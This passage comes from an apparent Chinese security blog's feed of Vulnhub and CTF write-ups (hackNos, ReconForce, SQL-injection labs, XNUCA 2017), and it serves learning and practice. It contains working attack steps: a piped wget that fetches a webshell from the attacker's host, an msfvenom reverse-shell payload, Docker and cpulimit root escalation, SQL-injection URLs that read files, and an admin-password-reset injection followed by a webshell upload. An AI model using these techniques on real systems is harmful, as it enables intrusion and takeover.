<pre><code class="php">$GLOBALS[&#39;config&#39;] = array (
  &#39;db&#39; =&gt; 
  array (
    &#39;host&#39; =&gt; &#39;localhost&#39;,
    &#39;user&#39; =&gt; &#39;cmsu&#39;,
    &#39;pass&#39; =&gt; &#39;securityx&#39;,
    &#39;name&#39; =&gt; &#39;cms&#39;,
  ),</code></pre>
<pre><code class="shell">MariaDB [cms]&gt; select username,pass from user;
select username,pass from user;
+----------+--------------------------------------------------------------+
| username | pass                                                         |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$E1OkzxLN.G4ZUYGgrGoQFusEFlkgNBeey9v7SI6jDHZQgL7G.YDFO |
+----------+--------------------------------------------------------------+</code></pre>
<p>无法解密，也没啥有用的信息。</p>
<p>那就上LinEnum搜集信息看看吧。从结果来看没有可以用来SUID提权的应用，也没有奇怪的进程。</p>
<p>有价值的信息如下：</p>
<pre><code>[-] It looks like we have some admin users:
uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm)
uid=1000(blackdevil) gid=118(docker) groups=118(docker),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lxd)

[+] Looks like we&#39;re hosting Docker:
Docker version 19.03.2, build 6a30dfca03</code></pre>
<p>有Docker，可能是利用docker提权，然后blackdevil用户在docker组里，而且他还在sudo组。那么关键就是blackdevil用户了。接下里就是想办法搜集blackdevil的信息，找到他的密码。</p>
<p>左翻右翻在<code>/var/local/</code>目录下发现了名为<code>database</code>的文件，内容如下：</p>
<pre><code>Expenses
Software Licenses,$2.78
Maintenance,$68.87
Mortgage Interest,$70.35
Advertising,$9.78
Phone,$406.80
Insurance,$9.04
Opss;fackespreadsheet</code></pre>
<p>以为是个费用记录，但是最后一行有点奇怪，去搜索一番，发现原来是结果encode的。</p>
<p>在<a href="http://www.spammimic.com/spreadsheet.php">该网站</a>可以decode。</p>
<p>该网站对于spreadsheet加密的解释如下：</p>
<pre><code>There are terrific tools (like PGP and GPG) for encrypting your mail. If somebody along the way looks at the mail they can&#39;t understand it. But they do know you are sending encrypted mail to your pal.

The answer: encode your message into something innocent looking.
Your messages will be safe and nobody will know they&#39;re encrypted!</code></pre>
<p>意思就是加密邮件内容，保证邮件安全。</p>
<p>解码后内容为：<code>Security@x@</code>，也就是balckdevil用户的密码。</p>
<h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><h3 id="方法1-直接sudo"><a href="#方法1-直接sudo" class="headerlink" title="方法1:直接sudo"></a>方法1:直接sudo</h3><pre><code class="shell">blackdevil@hacknos:/home$ sudo -l
[sudo] password for blackdevil:
Matching Defaults entries for blackdevil on hacknos:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User blackdevil may run the following commands on hacknos:
    (ALL : ALL) ALL
blackdevil@hacknos:/home$ sudo cat /root/root.txt
########    #####     #####   ########         ########
##     ##  ##   ##   ##   ##     ##            ##     ##
##     ## ##     ## ##     ##    ##            ##     ##
########  ##     ## ##     ##    ##            ########
##   ##   ##     ## ##     ##    ##            ##   ##
##    ##   ##   ##   ##   ##     ##            ##    ##
##     ##   #####     #####      ##    ####### ##     ##


MD5-HASH: bae11ce4f67af91fa58576c1da2aad4b

Author: Rahul Gehlaut

Blog: www.hackNos.com

Linkedin: https://in.linkedin.com/in/rahulgehlaut</code></pre>
<h3 id="方法2-Docker提权"><a href="#方法2-Docker提权" class="headerlink" title="方法2:Docker提权"></a>方法2:Docker提权</h3><p>上传Docker镜像和Dockerfile -&gt; 构建镜像 -&gt; 创建docker同时挂载etc目录 -&gt; docker创建用户加入sudo组 -&gt; 退出docker切换新建用户 -&gt; 拥有sudo权限</p>
<p>过程同：<code>http://lanvnal.com/2020/02/01/Vulnhub靶机之ReconForce01/#docker提权</code></p>
<h3 id="方法3：利用cpulimit提权"><a href="#方法3：利用cpulimit提权" class="headerlink" title="方法3：利用cpulimit提权"></a>方法3：利用cpulimit提权</h3><blockquote>
<p><a href="https://gtfobins.github.io/gtfobins/cpulimit/#sudo">https://gtfobins.github.io/gtfobins/cpulimit/#sudo</a></p>
</blockquote>
<p>www-data用户是没sudo权限的。可以在本地编译一个以root身份调用<code>/bin/bash</code>的C程序，然后配合cpulimit执行，达到提权的目的。</p>
<p>cpulimit利用方法：<a href="https://gtfobins.github.io/gtfobins/cpulimit/#sudo">https://gtfobins.github.io/gtfobins/cpulimit/#sudo</a></p>
<pre><code class="shell">sudo cpulimit -l 100 -f /bin/sh</code></pre>
<p>www-data用户没法sudo执行该指令。</p>
<p>在本机将下面源码编译，上传到靶机上给777权限，然后搭配cpulimit运行。</p>
<pre><code class="c">#include&lt;stdio.h&gt;
#include&lt;unistd.h&gt;
#include&lt;sys/types.h&gt;

int main()
&#123;
  setuid(0);
  setgid(0);
  system(&quot;/bin/bash&quot;);
  return 0;
&#125;</code></pre>
<p>编译：</p>
<pre><code class="shell">✦ ➜ gcc exp.c -o exp
exp.c:9:3: warning: implicit declaration of function &#39;system&#39; is invalid in C99
      [-Wimplicit-function-declaration]
  system(&quot;/bin/bash&quot;);
  ^
1 warning generated.</code></pre>
<p>上传后chmod然后和cpulimit一起用：</p>
<pre><code>www-data@hacknos:/tmp$ chmod 777 exp2
chmod 777 exp2
www-data@hacknos:/tmp$ cpulimit -l 100 -f ./exp2
cpulimit -l 100 -f ./exp2
Process 6468 detected
root@hacknos:/tmp# whoami
whoami
root
root@hacknos:/tmp# cat /root/root.txt</code></pre>
<blockquote>
<p>这里遇到个问题就是MAC下编译的程序在靶机上会报错，Ubuntu下编译的exp2就可以使用。</p>
</blockquote>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个靶机比较偏重信息搜集，同时第三种提权方式涨姿势了。</p>
]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub靶机之ReconForce01</title>
    <url>/2020/02/01/vulnhub-ba-ji-zhi-reconforce01/</url>
    <content><![CDATA[<h2 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h2><p><a href="https://www.vulnhub.com/entry/hacknos-reconforce,416/">hackNos: ReconForce</a></p>
<ul>
<li><strong>Name</strong>: hackNos: ReconForce</li>
<li><strong>Date release</strong>: 11 Jan 2020</li>
</ul>
<p>Difficulty: Easy to Intermediate</p>
<p>Flag: 2 Flag first user And the second root</p>
<p>Learning: Web Application | Enumeration | Privilege Escalation</p>
<blockquote>
<ul>
<li><strong><a href="https://drive.google.com/open?id=1kg7NJA4LmGfCFcwOl87kLJ5CXbP7fV7n">Download</a></strong> </li>
<li>**<a href="https://download.vulnhub.com/hacknos/ReconForce-01.ova">Download (Mirror)</a> **</li>
<li><strong>Download (<a href="https://download.vulnhub.com/hacknos/ReconForce-01.ova.torrent">Torrent</a>)</strong> (<a href="magnet:?xt=urn:btih:49D1999B4B152A43F1BC723229DCC23635477576&dn=ReconForce-01.ova&tr=http%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80/announce&tr=udp%3A%2F%2Ftracker.publicbt.com%3A80/announce&tr=udp%3A%2F%2Ftracker.istole.it%3A6969"> Magnet</a>)</li>
</ul>
</blockquote>
<p>使用VirtualBox打开并配置网络模式为：host-only</p>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>通过本机网络配置确定靶机位于网断：<code>192.168.56.0/24</code></p>
<p>使用nmap扫描，发现主机ip。</p>
<pre><code>nmap -sS -O -v 192.168.56.0/24

Nmap scan report for 192.168.56.103
Host is up (0.00069s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:02:41:02 (Oracle VirtualBox virtual NIC)</code></pre>
<p>扫描端口信息：</p>
<pre><code>➜ nmap -sT -A 192.168.56.103
Starting Nmap 7.70 ( https://nmap.org ) at 2020-02-04 22:02 CST
Nmap scan report for 192.168.56.103
Host is up (0.016s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.56.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 6f:96:94:65:72:80:08:93:23:90:20:bc:76:df:b8:ec (RSA)
|   256 6f:bb:49:1a:a9:b6:e5:00:84:19:a0:e4:2b:c4:57:c4 (ECDSA)
|_  256 ce:3d:94:05:f4:a6:82:c4:7f:3f:ba:37:1d:f6:23:b0 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Recon_Web
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
<p>得知开放21，22，80端口。</p>
<p>80端口有web服务，ftp服务允许匿名访问。</p>
<p><code>|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</code></p>
<blockquote>
<p>FTP的匿名登录一般有三种：<br>1、 用户名：anonymous 密码：Email或者为空<br>2、 用户名：FTP 密码：FTP或者为空<br>3、 用户名：USER 密码：pass</p>
</blockquote>
<p>拿dirsearch扫一下网站目录，结构如下：</p>
<pre><code>Target: http://192.168.56.103
/css
/index.html
/5ecure            #需认证</code></pre>
<p>index页面比较简洁，除了链接到/5ecure目录到按钮外其他链接均指向其他站点。</p>
<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>尝试匿名登陆ftp，但是ftp目录下空空如也，没啥有用的文件。</p>
<pre><code>➜ ftp 192.168.56.103
Connected to 192.168.56.103.
220 &quot;Secure@hackNos&quot;.
Name (192.168.56.103:lanvnal): Anonymous
331 Please specify the password.
Password:
230 Login successful.</code></pre>
<p>ftp这边没得到啥有用信息那就去看看web服务吧。</p>
<p><code>http://192.168.56.103/5ecure/</code>有个基础认证，应该是切入点。</p>
<p>尝试了常用弱口令，hackNos，ReconForce，Secure等都没有成功。</p>
<p>总不能爆破吧….在这卡了好久，去翻index链接的博客，发现了一篇WP,提供了思路。</p>
<blockquote>
<p>I go to ftp login and connecting with ftp username and ftp password and ls command to see target directory and the target directory is empty and we see the target ftp banner Security@hackNos</p>
</blockquote>
<p>ftp登陆的banner是基础认证密码，用户为admin。<br>但是banner是：Secure@hackNos，并不能成功登陆，试了博客中的Security@hackNos就正确了。<br>不知道是靶机错误还是我没get到。</p>
<p>登陆后：<br>该页面可以实现ping功能并返回结果。Fuzz后发现存在过滤。使用<code>｜</code>连接可以执行命令。</p>
<p>可以执行命令<br><code>aaa｜pwd</code></p>
<p>可以写文件</p>
<p><code>aaa|echo test&gt;test</code></p>
<p>但是有过滤，没法直接写shell。</p>
<p>cat命令查看out.php代码，发现黑名单过滤</p>
<pre><code class="php">有过滤：
    // Set blacklist
    $substitutions = array(
        &#39;&amp;&#39;  =&gt; &#39;&#39;,
        &#39;;&#39;  =&gt; &#39;&#39;,
        &#39;| &#39; =&gt; &#39;&#39;,
        &#39;-&#39;  =&gt; &#39;&#39;,
        &#39;$&#39;  =&gt; &#39;&#39;,
        &#39;(&#39;  =&gt; &#39;&#39;,
        &#39;)&#39;  =&gt; &#39;&#39;,
        &#39;`&#39;  =&gt; &#39;&#39;,
        &#39;||&#39; =&gt; &#39;&#39;,
    );</code></pre>
<p>发现wget命令可用，遂使用wget下载shell到靶机。</p>
<pre><code>a|wget 192.168.56.1:3333/shell.php</code></pre>
<p>因为有认证，将shell移动到上级目录，使用蚁剑连接。</p>
<p>在/home/recon/user.txt  中发现第一枚flag</p>
<pre><code>MD5HASH: bae11ce4f67af91fa58576c1da2aad4b</code></pre>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><strong>先搜集系统信息</strong></p>
<pre><code>www-data:/var/www/recon) $ uname -a
Linux hacknos 5.3.0-24-generic #26-Ubuntu SMP Thu Nov 14 01:33:18 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</code></pre>
<p>不适用Ubuntu的内核漏洞提权。</p>
<p>为了方便后续提权操作，使用msf来获取稳定meterpreter shellshell。使用msfvenom生成系统对应的meterpreter shell后通过蚁剑上传，更改权限，本地设置监听后执行。</p>
<pre><code>./msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=6666  -f elf -o /Users/lanvnal/Files/Vulnhub/ReconForce-01/shell.elf</code></pre>
<p>msf设置监听</p>
<pre><code>msf5 &gt; use exploit/multi/handler
msf5 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp
payload =&gt; linux/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) &gt; show options
msf5 exploit(multi/handler) &gt; set LHOST 192.168.56.1
LHOST =&gt; 192.168.56.1</code></pre>
<p>上传LinEnum来搜集信息。获取到如下有价值的信息。</p>
<pre><code>[-] Users that have previously logged onto the system:
Username         Port     From             Latest
recon            pts/0    192.168.0.104    Fri Jan 10 23:05:02 +0000 2020

[-] It looks like we have some admin users:
uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm)
uid=1000(recon) gid=119(docker) groups=119(docker),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lxd)

[+] Looks like we&#39;re hosting Docker:
Docker version 19.03.2, build 6a30dfca03</code></pre>
<p>通过搜集到的信息，并没有可以用来SUID提权的合适应用。</p>
<p>发现了近期登陆用户recon，而且属于sudo组。只要知道recon密码就成了～</p>
<p>尝试下最开始的密码<code>Security@hackNos</code>结果直接就切换到了<code>recon</code>用户。。。</p>
<p>试了一下用户recon可以ssh登陆。</p>
<h3 id="直接sudo"><a href="#直接sudo" class="headerlink" title="直接sudo"></a>直接sudo</h3><p>sudo su切换到root用户。获取flag</p>
<pre><code>root@hacknos:~# cat root.txt
     $$\          $$$$$$$\
     \$$\         $$  __$$\
$$$$\ \$$\        $$ |  $$ | $$$$$$\   $$$$$$$\  $$$$$$\  $$$$$$$\
\____| \$$\       $$$$$$$  |$$  __$$\ $$  _____|$$  __$$\ $$  __$$\
$$$$\  $$  |      $$  __$$&lt; $$$$$$$$ |$$ /      $$ /  $$ |$$ |  $$ |
\____|$$  /       $$ |  $$ |$$   ____|$$ |      $$ |  $$ |$$ |  $$ |
     $$  /        $$ |  $$ |\$$$$$$$\ \$$$$$$$\ \$$$$$$  |$$ |  $$ |
     \__/         \__|  \__| \_______| \_______| \______/ \__|  \__|




MD5HASH: bae11ce4f67af91fa58576c1da2aad4b

Author: Rahul Gehlaut

WebBlog: www.hackNos.com

Twitter: @rahul_gehlaut
</code></pre>
<h3 id="docker提权"><a href="#docker提权" class="headerlink" title="docker提权"></a>docker提权</h3><p>上面还运行着docker服务，尝试使用docker进行提权。</p>
<p>上传镜像和dockerfile。</p>
<p>构建镜像：</p>
<pre><code>docker build -t alpine:3.11 .
Sending build context to Docker daemon  2.726MB
Step 1/3 : FROM scratch
 ---&gt;
Step 2/3 : ADD alpine-minirootfs-3.11.3-x86_64.tar.gz /
 ---&gt; 7e80960be23b
Step 3/3 : CMD [&quot;/bin/sh&quot;]
 ---&gt; Running in 4e1cfbba3f17
Removing intermediate container 4e1cfbba3f17
 ---&gt; dd3aa746c7fc
Successfully built dd3aa746c7fc
Successfully tagged alpine:3.11</code></pre>
<p>创建docker，同时挂载目录</p>
<pre><code>docker run -it --rm -v /etc:/etc alpine:3.11 /bin/sh</code></pre>
<pre><code>创建用户
adduser test
添加到sudo组
usermod -aG sudo test
或
adduser test sudo</code></pre>
<p>退出docker，切换用户，执行sudo.</p>
<pre><code>test@hacknos:/var/www/docker$ sudo su
[sudo] password for test:
\root@hacknos:/var/www/docker# ls /root
root.txt  snap</code></pre>
<blockquote>
<p>参考：</p>
<p><a href="https://www.freebuf.com/articles/system/170783.html">https://www.freebuf.com/articles/system/170783.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>Writeup for sql注入靶机测试</title>
    <url>/2017/04/04/writeup/</url>
    <content><![CDATA[<h1 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h1><h2 id="—For-sql注入靶机测试"><a href="#—For-sql注入靶机测试" class="headerlink" title="—For sql注入靶机测试"></a>—For sql注入靶机测试</h2><p>一些资料–&gt;1.<a href="http://www.jianshu.com/p/b562a0d03cbb">http://www.jianshu.com/p/b562a0d03cbb</a></p>
<p>​            2.<a href="http://www.jianshu.com/p/ba35a7e1c67d">http://www.jianshu.com/p/ba35a7e1c67d</a></p>
<p>​            3.<a href="http://blog.idhyt.com/2015/04/21/technic-sql-inject/">http://blog.idhyt.com/2015/04/21/technic-sql-inject/</a></p>
<h2 id="gt-gt-SQL注入分类"><a href="#gt-gt-SQL注入分类" class="headerlink" title="&gt;&gt;SQL注入分类"></a>&gt;&gt;SQL注入分类</h2><ul>
<li><p>UNION query SQL injection（可联合查询注入）</p>
</li>
<li><p>Boolean-based blind SQL injection（布尔型注入）</p>
</li>
<li><p>Error-based SQL injection（报错型注入）</p>
</li>
<li><p>Stacked queries SQL injection（可多语句查询注入）</p>
</li>
<li><p>Time-based blind SQL injection（基于时间延迟注入）</p>
<a id="more"></a>

</li>
</ul>
<h2 id="gt-gt-SQL注入利用手法"><a href="#gt-gt-SQL注入利用手法" class="headerlink" title="&gt;&gt;SQL注入利用手法"></a>&gt;&gt;SQL注入利用手法</h2><h4 id="UNION-query-SQL-injection（可联合查询注入）"><a href="#UNION-query-SQL-injection（可联合查询注入）" class="headerlink" title="UNION query SQL injection（可联合查询注入）"></a>UNION query SQL injection（可联合查询注入）</h4><p>​    要求网站没有过滤关键字 没有转义 有显示位</p>
<h4 id="Error-based-SQL-injection（报错型注入）"><a href="#Error-based-SQL-injection（报错型注入）" class="headerlink" title="Error-based SQL injection（报错型注入）"></a>Error-based SQL injection（报错型注入）</h4><p>​    需要脚本输出 sql错误信息</p>
<h4 id="Boolean-based-blind-SQL-injection（布尔型注入）"><a href="#Boolean-based-blind-SQL-injection（布尔型注入）" class="headerlink" title="Boolean-based blind SQL injection（布尔型注入）"></a>Boolean-based blind SQL injection（布尔型注入）</h4><p>​    工作量大 需要时间</p>
<h4 id="Stacked-queries-SQL-injection（可多语句查询注入）"><a href="#Stacked-queries-SQL-injection（可多语句查询注入）" class="headerlink" title="Stacked queries SQL injection（可多语句查询注入）"></a>Stacked queries SQL injection（可多语句查询注入）</h4><p>​    有的数据库不支持</p>
<h4 id="Time-based-blind-SQL-injection（基于时间延迟注入）"><a href="#Time-based-blind-SQL-injection（基于时间延迟注入）" class="headerlink" title="Time-based blind SQL injection（基于时间延迟注入）"></a>Time-based blind SQL injection（基于时间延迟注入）</h4><p>​    可以在条件很苛刻的情况下注入（无报错，无显示位），但非常费时间。</p>
<h2 id="sql-1-103-238-227-13-10083"><a href="#sql-1-103-238-227-13-10083" class="headerlink" title="sql-1(103.238.227.13:10083)"></a>sql-1(103.238.227.13:10083)</h2><pre><code>
1-http://103.238.227.13:10083/?id=-1%df&#39; UNION SELECT 1,database() --+
2-http://103.238.227.13:10083/?id=-1%df&#39; UNION SELECT 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+
3-http://103.238.227.13:10083/?id=-1%df&#39; UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name=char(107,101,121) --+
4.http://103.238.227.13:10083/?id=-1%df&#39; UNION SELECT 1,group_concat(string) from .key group by id  --+</code></pre>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170402/013535527.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170402/013621013.png" alt="mark"></p>
<p><code>    id=1</code>后加<code>‘</code>没有报错，应该是加了<code>\</code>将其转义了。</p>
<p><strong>利用<a href="http://www.cnblogs.com/lcamry/articles/5625276.html">宽字节注入</a></strong></p>
<blockquote>
<blockquote>
<p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）。如果我们输入%df’看会怎样：我们可以看到，已经报错了。我们看到报错，说明sql语句出错，看到出错说明可以注入了。</p>
<p>为什么从刚才到现在，只是在’也就是%27前面加了一个%df就报错了？而且从图中可以看到，报错的原因就是多了一个单引号，而单引号前面的反斜杠不见了。</p>
<p>这就是mysql的特性，因为gbk是多字节编码，他认为两个字节代表一个汉字，所以%df和后面的\也就是%5c变成了一个汉字“運”，而’逃逸了出来。</p>
</blockquote>
</blockquote>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170402/014329429.png" alt="mark"></p>
<p>​    找到注入点了，order by 试出有2个字段。</p>
<p>​    union 查询爆数据库。以为可以一套出，结果。它。报。错。了。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170402/014712950.png" alt="mark"></p>
<p>​    然后再加上注释符。这样可以注释掉后面的sql语句，然后让其只执行攻击语句而达到目的。</p>
<p>​    继续。查询数据库。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170403/151814239.png" alt="mark"></p>
<p>​    得到sql5的库，继续，查表。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170403/151951812.png" alt="mark"></p>
<p>​    快好了，马上就好了。再查询key表的字段。</p>
<p>​    <img src="http://omfp4wyym.bkt.clouddn.com/blog/20170403/180547109.png" alt="mark"></p>
<p>​    注意到表名用了ascii码，因为用’key’时<code>&#39;&#39;</code>被转义了。</p>
<p>​    最后从key表查询，这里查询时key表直接输入有问题，试了试其他字符都可以，应该是有过滤。</p>
<p>​    <img src="http://omfp4wyym.bkt.clouddn.com/blog/20170404/160042687.png" alt="mark"></p>
<p>​    这里不断的试，发现有一个点来连接，高涵表哥发现.key可以执行。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170404/160200325.png" alt="mark"></p>
<p>​    这里`key`也可以绕过。</p>
<p>​    最后。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170403/181034762.png" alt="mark"></p>
<p>​    aaaaaaaaaa</p>
<h2 id="sql-2-103-238-227-13-10084"><a href="#sql-2-103-238-227-13-10084" class="headerlink" title="sql-2(103.238.227.13:10084)"></a>sql-2(103.238.227.13:10084)</h2><pre><code>http://103.238.227.13:10084/?id=-1+anD Updatexml(1,concat(0x7e,(SELEcT @@veRsion),0x7e),1)   --+</code></pre>
<p>​    updatexml的爆错原因是updatexml第二个参数需要的是Xpath格式的字符串。我们输入的显然不符合。故报错由此报错。</p>
<p>​    但updatexml的最大长度是32位的，所以有所局限（PS：但是应对大多的已经足够。）</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170403/181525952.png" alt="mark">    </p>
<p>​    数据库版本：5.5.48-log</p>
<h2 id="sql-3-103-238-227-13-10087"><a href="#sql-3-103-238-227-13-10087" class="headerlink" title="sql-3(103.238.227.13:10087)"></a>sql-3(103.238.227.13:10087)</h2><pre><code>http://103.238.227.13:10087/?id=1 u%00nion sel%00ect GROUP_CONCAT(hash),1 fr%00om .key --+</code></pre>
<p>​    提示给出了部分源码，可以看出对这么多查询语句都进行了过滤，而求大小写也不管用，会转换后比对。</p>
<p>​    %00 php和mysql对于其的处理不同，PHP会对其进行解码，而mysql会忽略，这样既绕过了过滤，又不影响sql语句的执行。</p>
<p>​    步骤和第一个差不多，直接查询就好。</p>
<p>​    这里查询时key表直接输入有问题，试了试其他字符都可以，应该是有过滤。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170404/155449465.png" alt="mark"></p>
<p>​        同1</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170403/185603966.png" alt="mark"></p>
<p>​    返回1~c3d3c17b4ca7f791f85e#$1cc72af274af4adef</p>
<h2 id="sql-4-103-238-227-13-10088"><a href="#sql-4-103-238-227-13-10088" class="headerlink" title="sql-4(103.238.227.13:10088)"></a>sql-4(103.238.227.13:10088)</h2><p>​    限制了空格，可以利用注释/**/代替空格，也可以用%0.</p>
<p>​    暴错注入，之前updatexml函数报错注入可以，这里也利用的updatexml()函数暴错，ExtractValue()也可以，返回的数据同样有限，最长32位，但可以分批次提取。</p>
<pre><code>
http://103.238.227.13:10088/?id=-1/**/and/**/updatexml(1,concat(0x7e,(SELECT@@version),0x7e),1)
</code></pre>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170404/163203172.png" alt="mark"></p>
<pre><code>http://103.238.227.13:10088/?id=-1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/load_file(0x2f7661722f746573742f6b65795f312e706870)),0x7e),1)</code></pre>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170404/163503756.png" alt="mark"></p>
<pre><code>http://103.238.227.13:10088/?id=1%0aand%0aupdatexml(1,concat(0x7e,(select%0a(substring(load_file(0x2f7661722f746573742f6b65795f312e706870),64,32))),0x7e),1)</code></pre>
<pre><code>http://103.238.227.13:10088/?id=1%0aand%0aupdatexml(1,concat(0x7e,(select%0a(substring(load_file(0x2f7661722f746573742f6b65795f312e706870),95,32))),0x7e),1)</code></pre>
<p>​    分2次读取再拼接。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170404/163757467.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170404/163850106.png" alt="mark"></p>
<p>得到Flag:”7249f5a7fd1de602b30e6f39aea6193a”</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>XNUCA-WriteUp</title>
    <url>/2017/09/04/xnuca-2017/</url>
    <content><![CDATA[<h1 id="XNUCA-2017"><a href="#XNUCA-2017" class="headerlink" title="XNUCA-2017"></a>XNUCA-2017</h1><blockquote>
<p>第一期WriteUp            </p>
</blockquote>
<p>​                            <strong>——By TK-好名字</strong></p>
<h2 id="No-1-你喜欢颜文字么"><a href="#No-1-你喜欢颜文字么" class="headerlink" title="No.1 你喜欢颜文字么"></a>No.1 你喜欢颜文字么</h2><p>点击重置密码，进入一个界面</p>
<p><img src="http://osn75zd5c.bkt.clouddn.com/2017%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E5%AE%89%E8%81%94%E8%B5%9B-%E4%BD%A0%E5%96%9C%E6%AC%A2%E9%A2%9C%E6%96%87%E5%AD%97%E4%B9%881.png"></p>
<p>用户名填admin 安全问题答案填 不喜欢，直接提交即可获得flag</p>
<h2 id="No-2-让你无语的md5"><a href="#No-2-让你无语的md5" class="headerlink" title="No.2 让你无语的md5"></a>No.2 让你无语的md5</h2><p>右键查看源代码有提示</p>
<pre><code>&lt;!--pav1和lloowweerrxx经常因为用同一个账号而吵起来--&gt;
&lt;!--pav1建数据库喜欢用默认的latin1，lloowweerrxx写程序的时候set了一下utf8,他们好像又吵起来啦--&gt;</code></pre>
<p>可参考</p>
<blockquote>
<p><a href="http://www.freebuf.com/articles/web/124537.html">http://www.freebuf.com/articles/web/124537.html</a><br>在查询栏中直接输入admin不行，要输入、</p>
</blockquote>
<pre><code>admin                          （后面跟一大串空格）</code></pre>
<p>然后会提示<br>​    </p>
<pre><code>16714f297ee17b13a097a15cd229c947这个MD5有点不同啊，快去somd5一下！</code></pre>
<p>百度一下 无语的md5,去这个网站直接查询</p>
<pre><code>https://www.somd5.com/</code></pre>
<p>获得flag</p>
<h2 id="NO-3-Pav1和lloowweerrxx-avi"><a href="#NO-3-Pav1和lloowweerrxx-avi" class="headerlink" title="NO.3 Pav1和lloowweerrxx.avi"></a>NO.3 Pav1和lloowweerrxx.avi</h2><p>该题利用的FFmpeg的任意文件读取漏洞，利用方式可参考</p>
<blockquote>
<p><a href="http://www.freebuf.com/vuls/138377.html">http://www.freebuf.com/vuls/138377.html</a></p>
</blockquote>
<p>下载脚本，直接执行</p>
<pre><code>python3 attack.py file:///home/user/flag sxcurity.mp4</code></pre>
<p>将生成的sxcurity.mp4直接上传，会跳转到download.php下载，之后获得一个视频文件，直接播放，前几帧中有flag</p>
<p><img src="http://osn75zd5c.bkt.clouddn.com/2017%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E5%AE%89%E8%81%94%E8%B5%9B-Pav1%E5%92%8Clloowweerrxx.avi-1.png"></p>
<h2 id="No-5愉快的玩耍吧"><a href="#No-5愉快的玩耍吧" class="headerlink" title="No.5愉快的玩耍吧"></a>No.5愉快的玩耍吧</h2><p>访问</p>
<pre><code>/admin/login/login_check.php?met_cookie_filter[a]=a%27,admin_pass=md5(1234567)+where+id=1;+%23--</code></pre>
<p>将admin密码改为了1234567</p>
<p>登陆后台</p>
<pre><code>user:admin
password:1234567</code></pre>
<p>更改网站配置</p>
<pre><code>将上传文件重命名改为不勾选
将允许上传文件格式添加PHP与PHP5</code></pre>
<p>发布–&gt;下载—&gt;文件或软件–&gt;选择文件上传</p>
<p>传入php5大马，回显路径，直接访问。</p>
<p>找到flag并添加文件。</p>
<p>截图:</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170826/213236811.png" alt="mark"></p>
